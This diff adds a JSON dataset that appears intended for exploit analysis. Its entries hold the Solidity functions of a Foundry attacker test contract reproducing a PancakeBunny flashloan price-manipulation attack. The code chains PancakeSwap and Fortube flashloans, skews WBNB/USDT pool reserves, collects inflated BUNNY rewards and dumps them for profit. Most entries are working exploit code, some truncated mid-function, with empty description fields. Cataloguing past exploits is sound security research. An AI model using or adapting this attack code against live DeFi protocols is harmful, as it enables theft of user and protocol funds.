@@ -1,0 +1,114 @@
+[
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "executeOperation",
+    "original_code": "    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) public {\n        uint256 usdtBalance = IERC20(USDT).balanceOf(address(this));\n\n        emit log_named_decimal_uint(\n            \"After all PCS flashloans, attacker WBNB balance:\",\n            IERC20(WBNB).balanceOf(address(this)),\n            IERC20(WBNB).decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"After Fortube Bank flashloan, USDT balance of attacker:\", usdtBalance, IERC20(USDT).decimals()\n        );\n\n        // *Actual exploit*\n        exploit();\n\n        // Start repaying flashloans\n        emit log_string(\"Repaying flashloans...\");\n\n        // Repay fortube flashloan\n        uint256 usdtOwed = amount + fee;\n        IERC20(USDT).transfer(FortubeBank.controller(), usdtOwed);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "exploit",
+    "original_code": "    function exploit() public {\n        uint256 wbnbAmount = IERC20(WBNB).balanceOf(address(this)) - 15_000e18;\n\n        // Manipulate BunnyMinter._zapAssetsToBunnyBNB - deposit liquidity\n        IERC20(WBNB).approve(address(zap), type(uint256).max);\n        zap.zapInToken(WBNB, 15_000e18, address(WBNBUSDTv2));\n        uint256 attackerLPBalance = IERC20(address(WBNBUSDTv2)).balanceOf(address(this));\n        IERC20(address(WBNBUSDTv2)).transfer(address(WBNBUSDTv2), attackerLPBalance);\n\n        emit log_string(\"Dumping all WBNB for USDT on WBNB+USDT v1 pool..\");\n\n        // Manipulate WBNB - USDT pair\n        (uint256 reserve0, uint256 reserve1,) = WBNBUSDTv1.getReserves();\n        uint256 amountIn = wbnbAmount;\n        uint256 amountOut = router.getAmountOut(amountIn, reserve1, reserve0);\n        IERC20(WBNB).transfer(address(WBNBUSDTv1), amountIn);\n        WBNBUSDTv1.swap(amountOut, 0, address(this), hex\"\");\n\n        emit log_named_decimal_uint(\n            \"After dumping all WBNB, WBNB balance of attacker:\",\n            IERC20(WBNB).balanceOf(address(this)),\n            IERC20(WBNB).decimals()\n        );\n        emit log_named_decimal_uint(\n            \"After dumping all WBNB, USDT balance of attacker:\",\n            IERC20(USDT).balanceOf(address(this)),\n            IERC20(USDT).decimals()\n        );\n\n        //Collect inflated rewards\n        flip.getReward();\n\n        emit log_named_decimal_uint(\n            \"After collecting rewards, BUNNY balance of attacker:\",\n            IERC20(BUNNY).balanceOf(address(this)),\n            IERC20(BUNNY).decimals()\n        );\n\n        //Dump BUNNY\n        emit log_string(\"Dumping all BUNNY for WBNB on WBNB+BUNNY pool...\");\n        {\n            uint256 bunnyBalance = IERC20(BUNNY).balanceOf(address(this)) - 1;\n            (uint256 reserve0, uint256 reserve1,) = WBNBBUNNY.getReserves();\n            uint256 amountIn = bunnyBalance;\n            uint256 amountOut = router.getAmountOut(bunnyBalance, reserve1, reserve0);\n\n            IERC20(BUNNY).transfer(address(WBNBBUNNY), amountIn);\n            WBNBBUNNY.swap(amountOut, 0, address(this), hex\"\");\n\n            emit log_named_decimal_uint(\n                \"After dumping all BUNNY, WBNB balance of attacker:\",\n                IERC20(WBNB).balanceOf(address(this)),\n                IERC20(WBNB).decimals()\n            );\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "pancakeCall",
+    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        (uint256 level, uint256 asset) = abi.decode(data, (uint256, uint256));\n\n        // Take 6 WBNB flashloans from PCS\n        if (level + 1 < 7) {\n            level++;\n            (uint256 _amount0, uint256 _amount1,) = pairs[level].getReserves();\n            if (WBNB == pairs[level].token1()) {\n                pairs[level].swap(0, _amount1 - 1, address(this), abi.encode(level, 1));\n            } else {\n                pairs[level].swap(_amount0 - 1, 0, address(this), abi.encode(level, 0));\n            }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        payable(WBNB).call{value: 1e18}(\"\");\n\n        emit log_named_decimal_uint(\n            \"Initial WBNB balance of attacker:\", IERC20(WBNB).balanceOf(address(this)), IERC20(WBNB).decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Initial USDT balance of attacker:\", IERC20(USDT).balanceOf(address(this)), IERC20(USDT).decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Initial BUNNY balance of attacker:\", IERC20(BUNNY).balanceOf(address(this)), IERC20(BUNNY).decimals()\n        );\n\n        // Deposit a minimum amount of WBNB + USDT to VaultFlipToFlip, transfer LP tokens to WBNB + USDT Pancake pool.\n        emit log_string(\"Zapping 1 WBNB into WBNB+USDT v2 pool...\");\n\n        zap.zapInToken(WBNB, 1e18, address(WBNBUSDTv2));\n        uint256 lpamount = IERC20(address(WBNBUSDTv2)).balanceOf(address(this));\n        flip.deposit(lpamount);\n\n        emit log_string(\"After X blocks, the keeper of VaultFlipToFlip calls harvest()\");\n\n        cheat.warp(1_655_908_339);\n        cheat.roll(7_556_391);\n\n        // Keeper needs to call flip.harvest() so that flip.earned(address(this)) > 0\n        cheat.prank(keeper);\n        (bool success,) = address(flip).call(abi.encodeWithSignature(\"harvest()\"));\n        require(success, \"flip.harvest() fails\");\n\n        emit log_string(\"Exploit begins:\");\n\n        trigger();\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "trigger",
+    "original_code": "    function trigger() public {\n        if (flip.earned(address(this)) > 0) {\n            //Initiate flashloans\n            emit log_string(\"Initiate flashloans...\");\n\n            (uint256 _amount0, uint256 _amount1,) = pairs[0].getReserves();\n            if (WBNB == pairs[0].token1()) {\n                pairs[0].swap(0, _amount1 - 1, address(this), abi.encode(0, 1));\n            } else {\n                pairs[0].swap(_amount0 - 1, 0, address(this), abi.encode(0, 0));\n            }\n\n            // execution passes to pancakeCall()\n\n            // all flashloans have been repaid!\n            emit log_string(\"All flashloans have been repaid!\");\n\n            //Collect profit\n            emit log_named_decimal_uint(\n                \"Collected WBNB profit:\", IERC20(WBNB).balanceOf(address(this)), IERC20(WBNB).decimals()\n            );\n            emit log_named_decimal_uint(\n                \"Collected USDT profit:\", IERC20(USDT).balanceOf(address(this)), IERC20(USDT).decimals()\n            );\n        } else {\n            revert(\"Nothing earned.\");\n        }\n",
+    "description": ""
+  }
+]
